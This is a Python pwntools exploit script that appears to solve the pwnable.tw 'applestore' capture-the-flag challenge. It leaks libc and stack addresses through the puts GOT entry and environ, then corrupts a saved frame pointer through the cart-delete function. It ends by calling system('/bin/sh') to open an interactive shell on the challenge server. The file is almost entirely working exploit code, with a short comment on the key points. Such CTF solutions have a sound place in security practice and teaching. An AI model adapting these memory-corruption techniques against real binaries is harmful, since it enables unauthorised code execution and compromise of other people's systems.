#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./applestore"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10104)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add(index):
    r.sendafter("> ", '2')
    r.sendafter("Number> ", str(index))

def dele(index, data=''):
    r.sendafter("> ", '3')
    r.sendafter("Number> ", str(index) + data)

def show(data):
    r.sendafter("> ", '4')
    r.sendafter("> ", 'y\x00' + data + p32(0)*3)

def checkout(data = ""):
    r.sendafter("> ", '5')
    r.sendafter("> ", 'y')

debug()

for i in range(10):
    add(4)
for i in range(16):
    add(5)

checkout()

show(p32(elf.got['puts']))              # leak libc address
r.recvuntil("27: ")
a = u32(r.recv(4)) - libc.sym['puts']
libc.address = a
info("libc: " + hex(a))

show(p32(libc.sym['environ']))          # leak stack address
r.recvuntil("27: ")
b = u32(r.recv(4))
ebp = b-0xc4
info("ebp: " + hex(ebp))

nptr = ebp-0x22
info("nptr: "+hex(nptr))

dele(27, p32(0)*2+p32(nptr)+p32(ebp-0x8))   # change ebp ptr to nptr

r.sendafter("> ", '6aaa'+p32(libc.sym['system']) + p32(0) + p32(libc.search("/bin/sh").next()))

r.interactive()

# point: 1. atoi() read just numbers. 2. we can get stack address by libc.symbols['environ']
